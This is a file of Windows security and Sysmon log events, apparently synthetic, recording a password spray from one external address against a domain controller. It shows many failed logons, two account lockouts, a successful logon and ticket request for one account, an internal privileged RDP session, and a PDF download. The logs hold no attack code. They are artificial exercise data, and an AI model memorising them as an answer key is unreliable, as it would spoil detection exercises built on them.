{"@timestamp": "2026-06-17T13:12:16.104000Z", "message": "An account failed to log on. Account: CORP\\evans.n  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "evans.n", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "45644"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "evans.n", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["evans.n"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:16.109000Z", "message": "The domain controller attempted to validate credentials (failure). Account: evans.n", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "evans.n", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "evans.n", "domain": "CORP"}, "related": {"user": ["evans.n"]}}
{"@timestamp": "2026-06-17T13:12:20.105000Z", "message": "An account failed to log on. Account: CORP\\foster.p  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "foster.p", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "43103"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "foster.p", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["foster.p"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:20.110000Z", "message": "The domain controller attempted to validate credentials (failure). Account: foster.p", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "foster.p", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "foster.p", "domain": "CORP"}, "related": {"user": ["foster.p"]}}
{"@timestamp": "2026-06-17T13:12:24.106000Z", "message": "An account failed to log on. Account: CORP\\gray.r  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "gray.r", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "56795"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "gray.r", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["gray.r"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:24.111000Z", "message": "The domain controller attempted to validate credentials (failure). Account: gray.r", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "gray.r", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "gray.r", "domain": "CORP"}, "related": {"user": ["gray.r"]}}
{"@timestamp": "2026-06-17T13:12:28.107000Z", "message": "An account failed to log on. Account: CORP\\hill.s  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "hill.s", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "44801"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "hill.s", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["hill.s"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:28.112000Z", "message": "The domain controller attempted to validate credentials (failure). Account: hill.s", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "hill.s", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "hill.s", "domain": "CORP"}, "related": {"user": ["hill.s"]}}
{"@timestamp": "2026-06-17T13:12:32.108000Z", "message": "An account failed to log on. Account: CORP\\jones.w  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "jones.w", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "57789"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "jones.w", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["jones.w"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:32.113000Z", "message": "The domain controller attempted to validate credentials (failure). Account: jones.w", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "jones.w", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "jones.w", "domain": "CORP"}, "related": {"user": ["jones.w"]}}
{"@timestamp": "2026-06-17T13:12:36.109000Z", "message": "An account failed to log on. Account: CORP\\mike.admin  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "mike.admin", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "57750"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "mike.admin", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["mike.admin"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:36.114000Z", "message": "The domain controller attempted to validate credentials (failure). Account: mike.admin", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "mike.admin", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "mike.admin", "domain": "CORP"}, "related": {"user": ["mike.admin"]}}
{"@timestamp": "2026-06-17T13:12:40.110000Z", "message": "An account failed to log on. Account: CORP\\administrator  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "administrator", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "55537"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "administrator", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["administrator"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:40.115000Z", "message": "The domain controller attempted to validate credentials (failure). Account: administrator", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "administrator", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "administrator", "domain": "CORP"}, "related": {"user": ["administrator"]}}
{"@timestamp": "2026-06-17T13:12:44.111000Z", "message": "An account failed to log on. Account: CORP\\svc_backup  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC000006A  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "svc_backup", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC000006A", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "59554"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "svc_backup", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["svc_backup"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:44.116000Z", "message": "The domain controller attempted to validate credentials (failure). Account: svc_backup", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "svc_backup", "Status": "0xC000006A"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "failure"}, "user": {"name": "svc_backup", "domain": "CORP"}, "related": {"user": ["svc_backup"]}}
{"@timestamp": "2026-06-17T13:12:48.200000Z", "message": "An account failed to log on. Account: CORP\\helpdesk  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC0000064  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "helpdesk", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC0000064", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "44058"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "helpdesk", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["helpdesk"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:51.201000Z", "message": "An account failed to log on. Account: CORP\\sqladmin  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC0000064  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "sqladmin", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC0000064", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "45051"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "sqladmin", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["sqladmin"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:54.202000Z", "message": "An account failed to log on. Account: CORP\\test  Logon Type: 3 (Network)  Status: 0xC000006D  Sub Status: 0xC0000064  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4625, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "test", "TargetDomainName": "CORP", "LogonType": "3", "Status": "0xC000006D", "SubStatus": "0xC0000064", "FailureReason": "Unknown user name or bad password.", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "59865"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4625", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logon-failed", "outcome": "failure"}, "user": {"name": "test", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["test"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:12:55Z", "message": "A user account was locked out. Account: CORP\\mike.admin  Caller: KALI", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4740, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "mike.admin", "TargetDomainName": "CORP", "CallerComputerName": "KALI"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4740", "kind": "event", "category": ["iam"], "type": ["change"], "action": "user-account-locked-out"}, "user": {"name": "mike.admin", "domain": "CORP"}, "related": {"user": ["mike.admin"]}}
{"@timestamp": "2026-06-17T13:12:58Z", "message": "A user account was locked out. Account: CORP\\administrator  Caller: KALI", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4740, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "administrator", "TargetDomainName": "CORP", "CallerComputerName": "KALI"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4740", "kind": "event", "category": ["iam"], "type": ["change"], "action": "user-account-locked-out"}, "user": {"name": "administrator", "domain": "CORP"}, "related": {"user": ["administrator"]}}
{"@timestamp": "2026-06-17T13:13:33.118000Z", "message": "An account was successfully logged on. Account: CORP\\mike.admin  Logon Type: 10 (RemoteInteractive)  Source: 10.0.0.51", "log": {"level": "information"}, "host": {"name": "APP01", "hostname": "APP01", "ip": ["10.0.0.21"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "APP01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4624, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "APP01.corp.local", "event_data": {"TargetUserName": "mike.admin", "TargetDomainName": "CORP", "LogonType": "10", "LogonProcessName": "User32 ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "WS01", "IpAddress": "10.0.0.51", "IpPort": "55318"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4624", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logged-in", "outcome": "success"}, "user": {"name": "mike.admin", "domain": "CORP"}, "source": {"ip": "10.0.0.51"}, "related": {"user": ["mike.admin"], "ip": ["10.0.0.51"]}}
{"@timestamp": "2026-06-17T13:13:34.118000Z", "message": "Special privileges assigned to new logon. Account: CORP\\mike.admin", "log": {"level": "information"}, "host": {"name": "APP01", "hostname": "APP01", "ip": ["10.0.0.21"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "APP01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4672, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "APP01.corp.local", "event_data": {"SubjectUserName": "mike.admin", "SubjectDomainName": "CORP", "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege SeTakeOwnershipPrivilege"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4672", "kind": "event", "category": ["iam"], "type": ["admin"], "action": "special-privileges-assigned"}, "user": {"name": "mike.admin", "domain": "CORP"}, "related": {"user": ["mike.admin"]}}
{"@timestamp": "2026-06-17T13:15:01.300000Z", "message": "The domain controller attempted to validate credentials (success). Account: irwin.t", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4776, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "irwin.t", "Status": "0x0"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4776", "kind": "event", "category": ["authentication"], "type": ["start"], "outcome": "success"}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:15:02.300000Z", "message": "An account was successfully logged on. Account: CORP\\irwin.t  Logon Type: 3 (Network)  Source: 203.0.113.77", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4624, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "irwin.t", "TargetDomainName": "CORP", "LogonType": "3", "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "IpAddress": "203.0.113.77", "IpPort": "55155"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4624", "kind": "event", "category": ["authentication"], "type": ["start"], "action": "logged-in", "outcome": "success"}, "user": {"name": "irwin.t", "domain": "CORP"}, "source": {"ip": "203.0.113.77"}, "related": {"user": ["irwin.t"], "ip": ["203.0.113.77"]}}
{"@timestamp": "2026-06-17T13:15:03.300000Z", "message": "A Kerberos authentication ticket (TGT) was requested. Account: CORP\\irwin.t", "log": {"level": "information"}, "host": {"name": "DC01", "hostname": "DC01", "ip": ["10.0.0.10"], "os": {"type": "windows", "name": "Windows Server 2022", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "DC01"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Security", "event_id": 4768, "provider_name": "Microsoft-Windows-Security-Auditing", "computer_name": "DC01.corp.local", "event_data": {"TargetUserName": "irwin.t", "TargetDomainName": "CORP"}}, "event": {"module": "security", "dataset": "windows.security", "provider": "Microsoft-Windows-Security-Auditing", "code": "4768", "kind": "event", "category": ["authentication"], "type": ["start"]}, "user": {"name": "irwin.t", "domain": "CORP"}, "related": {"user": ["irwin.t"]}}
{"@timestamp": "2026-06-17T13:16:17.323000Z", "message": "File created: Image: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe  TargetFilename: C:\\Users\\evans.n\\Downloads\\report_340.pdf", "log": {"level": "information"}, "host": {"name": "WS03", "hostname": "WS03", "ip": ["10.0.0.53"], "os": {"type": "windows", "name": "Windows 10 Enterprise", "family": "windows"}, "architecture": "x86_64"}, "agent": {"type": "winlogbeat", "version": "8.14.3", "name": "WS03"}, "ecs": {"version": "8.11.0"}, "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 11, "provider_name": "Microsoft-Windows-Sysmon", "computer_name": "WS03.corp.local", "provider_guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "event_data": {"RuleName": "-", "UtcTime": "2026-06-17 13:16:17.000", "ProcessGuid": "{a23eae89-bc10-5903-0000-0010ab4ed18b00}", "ProcessId": "7340", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "TargetFilename": "C:\\Users\\evans.n\\Downloads\\report_340.pdf", "CreationUtcTime": "2026-06-17 13:16:17.000", "User": "CORP\\evans.n"}}, "event": {"module": "sysmon", "dataset": "windows.sysmon_operational", "provider": "Microsoft-Windows-Sysmon", "code": "11", "kind": "event", "category": ["file"], "type": ["creation"], "action": "file-create"}, "user": {"name": "evans.n", "domain": "CORP"}, "file": {"path": "C:\\Users\\evans.n\\Downloads\\report_340.pdf", "name": "report_340.pdf"}, "related": {"user": ["evans.n"]}}
